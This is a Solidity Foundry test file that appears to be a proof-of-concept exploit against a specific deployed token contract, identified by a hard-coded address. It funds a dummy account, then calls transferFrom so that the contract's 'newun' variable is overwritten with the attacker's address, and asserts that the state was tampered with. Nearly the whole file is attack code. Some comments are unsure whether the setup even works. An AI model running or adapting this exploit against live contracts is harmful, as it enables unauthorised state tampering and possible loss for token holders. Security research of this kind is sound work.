// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ICryptocasil {
    function newun() external view returns (address);
    function transferFrom(address from, address to, uint tokens) external returns (bool);
    function approve(address spender, uint tokens) external returns (bool);
    function balanceOf(address tokenOwner) external view returns (uint);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x63769c0499f94D4E31fAc0F01D5d226bdd2C927D;
    address attacker = address(this);
    address dummy = address(0x123);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed beyond the default fork
        // We'll create a dummy address with tokens and approval
        address dummy = address(0x123);
        // Give dummy some tokens via deal (since balances mapping)
        // deal works for ERC20? deal is for native and ERC20 tokens in Foundry.
        deal(TARGET, dummy, 1000 ether);
        // Approve attacker (address(this)) to spend tokens from dummy
        vm.prank(dummy);
        ICryptocasil(TARGET).approve(attacker, 1000 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Check initial newun is zero
        address initialNewun = ICryptocasil(TARGET).newun();
        require(initialNewun == address(0), "newun not zero initially");

        // Step 2: Call transferFrom with dummy as from, attacker as to
        // This will set newun to attacker address because newun == address(0) and from != address(0)
        vm.prank(attacker);
        ICryptocasil(TARGET).transferFrom(dummy, attacker, 1 ether);

        // Step 3: Verify newun is now attacker address
        address finalNewun = ICryptocasil(TARGET).newun();
        assertEq(finalNewun, attacker, "newun not set to attacker");
        assertEq(finalNewun, attacker, "Logic Exploit Failed: State not tampered");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
